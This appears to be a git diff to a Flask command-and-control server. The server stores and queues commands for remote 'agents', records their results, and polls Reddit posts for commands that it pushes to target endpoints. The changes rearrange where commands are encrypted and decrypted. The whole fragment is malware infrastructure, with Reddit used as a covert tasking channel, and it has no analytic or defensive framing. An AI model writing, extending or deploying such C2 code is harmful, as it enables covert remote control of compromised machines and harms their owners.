@@ -87,11 +87,13 @@ def result():
     command = Command.query.get(cmd_id)
     if command:
         command.status = "Completed"
-        command.result = decrypt(output)   # Store Results Decrypted
+        # 🔹 decrypt before storing
+        command.result = decrypt(output)  
         command.completed_at = datetime.utcnow()
         db.session.commit()
 
     return jsonify({"status": "result stored", "command_id": cmd_id})
+
 
 # ----------------------------
 # Operator queues a command (direct or via poller)
@@ -105,11 +107,19 @@ def queue_command():
     if not agent_id or not cmd_text:
         return jsonify({"error": "agent_id and command required"}), 400
 
-    new_cmd = Command(agent_id=agent_id, command=encrypt(cmd_text), status="Queued")
+    # 🔹 decrypt before storing in DB
+    plain_cmd = decrypt(cmd_text)
+    new_cmd = Command(agent_id=agent_id, command=plain_cmd, status="Queued")
     db.session.add(new_cmd)
     db.session.commit()
 
-    return jsonify({"status": "queued", "agent_id": agent_id, "command": cmd_text, "command_id": new_cmd.id})
+    return jsonify({
+        "status": "queued",
+        "agent_id": agent_id,
+        "command": plain_cmd,
+        "command_id": new_cmd.id
+    })
+
 
 
 # ----------------------------
@@ -183,7 +193,7 @@ def poll_reddit():
 
             for endpoint in targets:
                 for command in commands:
-                    payload = {"agent_id": endpoint, "command": command}
+                    payload = {"agent_id": endpoint, "command": encrypt(command)}
                     requests.post(f"{SERVER_URL}/queue", json=payload)
 
             # Mark post as processed
